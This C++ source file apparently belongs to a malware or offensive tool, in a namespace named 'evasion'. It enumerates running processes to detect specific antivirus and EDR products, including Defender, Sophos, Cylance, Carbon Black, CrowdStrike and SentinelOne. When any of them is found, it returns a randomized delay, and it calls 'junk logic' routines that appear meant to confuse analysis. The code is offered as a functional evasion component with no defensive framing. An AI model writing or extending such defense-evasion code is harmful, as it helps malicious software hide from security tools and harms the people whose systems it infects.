#include "Detection.h"
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <algorithm>
#include <random>
#include <cwctype>
#include "JunkLogic.h"

namespace evasion {

bool Detection::IsAVPresent() {
    JunkLogic::GenerateEntropy();
    std::vector<std::wstring> avProcesses = {
        L"MsMpEng.exe", L"MpCmdRun.exe",
        L"SavService.exe", L"SAVAdminService.exe",
        L"CylanceSvc.exe", L"CylanceUI.exe"
    };

    for (const auto& av : avProcesses) {
        if (IsProcessRunning(av)) return true;
    }
    return false;
}

bool Detection::IsEDRPresent() {
    JunkLogic::PerformComplexMath();
    std::vector<std::wstring> edrProcesses = {
        L"CbSvc.exe", L"CbDefense.exe",
        L"csfalconservice.exe", L"SentinelAgent.exe",
        L"elastic-endpoint.exe"
    };

    for (const auto& edr : edrProcesses) {
        if (IsProcessRunning(edr)) return true;
    }
    return false;
}

int Detection::GetJitterDelay() {
    if (IsEDRPresent() || IsAVPresent()) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(120, 480);
        return dis(gen);
    }
    return 0;
}

bool Detection::IsProcessRunning(const std::wstring& processName) {
    bool found = false;

    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    // Use EnumProcesses from psapi
    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded)) {
        // Fallback to Toolhelp
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe;
            pe.dwSize = sizeof(pe);
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    std::wstring currentProcess = pe.szExeFile;
                    for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                    std::wstring targetProcess = processName;
                    for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
                    if (currentProcess == targetProcess) { found = true; break; }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }
        return found;
    }

    cProcesses = cbNeeded / sizeof(DWORD);
    for (i = 0; i < cProcesses; i++) {
        if (aProcesses[i] != 0) {
            wchar_t szProcessName[MAX_PATH] = L"<unknown>";
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
            if (NULL != hProcess) {
                HMODULE hMod;
                DWORD cbNeededMod;
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeededMod)) {
                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
                }
                CloseHandle(hProcess);

                std::wstring currentProcess = szProcessName;
                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                std::wstring targetProcess = processName;
                for (auto& c : targetProcess) c = (wchar_t)::towlower(c);

                if (currentProcess == targetProcess) { found = true; break; }
            }
        }
    }

    return found;
}

} // namespace evasion
